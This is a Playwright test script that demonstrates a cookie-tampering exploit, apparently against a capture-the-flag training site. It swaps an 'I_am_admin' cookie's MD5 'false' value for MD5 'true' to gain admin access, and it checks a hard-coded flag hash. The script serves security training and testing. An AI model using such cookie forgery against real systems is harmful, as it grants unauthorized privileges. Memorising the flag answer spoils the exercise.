const { test, expect } = require('@playwright/test');
const crypto = require('crypto-js');

test('Cookie Tampering Vulnerability', async ({ page }) => {
  // Navigate to the main page
  await page.goto('/index.php');
  
  // Take screenshot before any cookie manipulation
  await page.screenshot({ path: 'reports/cookie-tampering-before.png' });
  
  // Get all the cookies
  const cookies = await page.context().cookies();
  
  // Find the admin cookie
  const adminCookie = cookies.find(cookie => cookie.name === 'I_am_admin');
  
  // Show the cookie and its value in the page
  if (adminCookie) {
    await page.evaluate((cookieInfo) => {
      // Create a display for the cookie info
      const cookieDisplay = document.createElement('div');
      cookieDisplay.style.position = 'fixed';
      cookieDisplay.style.top = '10px';
      cookieDisplay.style.right = '10px';
      cookieDisplay.style.padding = '10px';
      cookieDisplay.style.backgroundColor = '#f0f0f0';
      cookieDisplay.style.border = '2px solid blue';
      cookieDisplay.style.zIndex = '9999';
      
      // Format the cookie info
      const cookieName = document.createElement('div');
      cookieName.textContent = `Cookie Name: ${cookieInfo.name}`;
      cookieName.style.marginBottom = '5px';
      
      const cookieValue = document.createElement('div');
      cookieValue.textContent = `Current Value (MD5): ${cookieInfo.value}`;
      cookieValue.style.marginBottom = '5px';
      
      const cookieMeaning = document.createElement('div');
      cookieMeaning.textContent = 'This is MD5 hash of "false"';
      cookieMeaning.style.marginBottom = '15px';
      
      const targetValue = document.createElement('div');
      targetValue.textContent = `Target Value (MD5 of "true"): b326b5062b2f0e69046810717534cb09`;
      targetValue.style.marginBottom = '5px';
      
      // Add the elements to the display
      cookieDisplay.appendChild(cookieName);
      cookieDisplay.appendChild(cookieValue);
      cookieDisplay.appendChild(cookieMeaning);
      cookieDisplay.appendChild(targetValue);
      
      // Add the display to the page
      document.body.appendChild(cookieDisplay);
    }, adminCookie);
  }
  
  // Wait to show the cookie information
  await page.waitForTimeout(3000);
  
  // Take screenshot showing the cookie info
  await page.screenshot({ path: 'reports/cookie-tampering-info.png' });
  
  // Create MD5 hash of "true" (this is already known but shown for demonstration)
  const trueHash = 'b326b5062b2f0e69046810717534cb09'; // MD5 of "true"
  
  // Set the cookie with the new value
  await page.context().addCookies([
    {
      name: 'I_am_admin',
      value: trueHash,
      domain: new URL(page.url()).hostname,
      path: '/'
    }
  ]);
  
  // Show the cookie being changed
  await page.evaluate((newHash) => {
    const cookieDisplay = document.querySelector('div[style*="position: fixed"]');
    if (cookieDisplay) {
      const changedValue = document.createElement('div');
      changedValue.textContent = `Setting New Value: ${newHash}`;
      changedValue.style.color = 'red';
      changedValue.style.fontWeight = 'bold';
      changedValue.style.marginBottom = '5px';
      cookieDisplay.appendChild(changedValue);
    }
  }, trueHash);
  
  // Wait to show the cookie change
  await page.waitForTimeout(2000);
  
  // Take screenshot showing the cookie change
  await page.screenshot({ path: 'reports/cookie-tampering-modified.png' });
  
  // Configure dialog handling before the reload
  page.on('dialog', async dialog => {
    // Save the alert message
    const alertText = dialog.message();
    console.log('FLAG FOUND:', alertText);
    
    // Accept the alert
    await dialog.accept();
    
    // Create a visual display of the flag on the page
    await page.evaluate((flagText) => {
      const flagDisplay = document.createElement('div');
      flagDisplay.style.position = 'fixed';
      flagDisplay.style.top = '50%';
      flagDisplay.style.left = '50%';
      flagDisplay.style.transform = 'translate(-50%, -50%)';
      flagDisplay.style.padding = '20px';
      flagDisplay.style.backgroundColor = '#FFFF00';
      flagDisplay.style.border = '4px solid green';
      flagDisplay.style.zIndex = '10000';
      flagDisplay.style.fontSize = '18px';
      flagDisplay.style.fontWeight = 'bold';
      flagDisplay.textContent = flagText;
      document.body.appendChild(flagDisplay);
    }, alertText);
    
    // Verify the flag is correct
    expect(alertText).toContain('df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3');
  });
  
  // Refresh the page to trigger the alert with the flag
  await page.reload();
  
  // Wait a bit to ensure dialog has been handled
  await page.waitForTimeout(2000);
  
  // Take screenshot after accepting the alert
  await page.screenshot({ path: 'reports/cookie-tampering-after.png' });
  
  // Wait to show the flag
  await page.waitForTimeout(3000);
  
  // Take screenshot showing the flag
  await page.screenshot({ path: 'reports/cookie-tampering-flag.png' });

});